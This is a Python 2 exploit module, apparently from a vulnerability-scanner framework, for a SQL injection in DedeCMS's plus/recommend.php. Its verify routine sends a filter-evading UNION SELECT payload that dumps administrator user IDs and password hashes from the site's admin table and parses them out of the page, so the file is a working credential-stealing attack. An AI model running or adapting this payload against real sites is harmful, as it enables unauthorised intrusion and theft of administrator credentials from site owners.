#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: Lcy
# @Date:   2016-09-20 15:34:41
# @Last Modified by:   Lcy
# @Last Modified time: 2016-09-26 11:51:31
import requests
import re
import urlparse

class Exploit:
    def __init__(self,target,expfile):
        self.target = target
        self.result = {
            "name": "Dedecms recommend.php sql注入漏洞",
            "author": "Lcy",
            "type": "website",
            "ref": "https://phpinfo.me/2014/02/28/409.html",
            "status":False,
            "info":"",
            'filename':expfile,
            "target":target,
        }
    def verify(self):
        vulurl = urlparse.urljoin(self.target, "/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa\%27and+char(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x383839386739617364,group_concat(0x7C,userid,0x3a,pwd,0x7C),0x3C2F6162633E),5,6,7,8,9%20from%20`%23@__admin`%23")
        resp = requests.get(vulurl,timeout=5)
        if '8898g9asd' in resp.content:
            match_result = re.search(r'8898g9asd\|(.*?)\:(.*?)\|\<\/abc\>',resp.content,re.I|re.M)
            if match_result:
                self.result['status'] = True
                self.result['info'] = "目标存在dedecms recommend.php注入漏洞, 注入结果:%s|%s" % (match_result.group(1),match_result.group(2))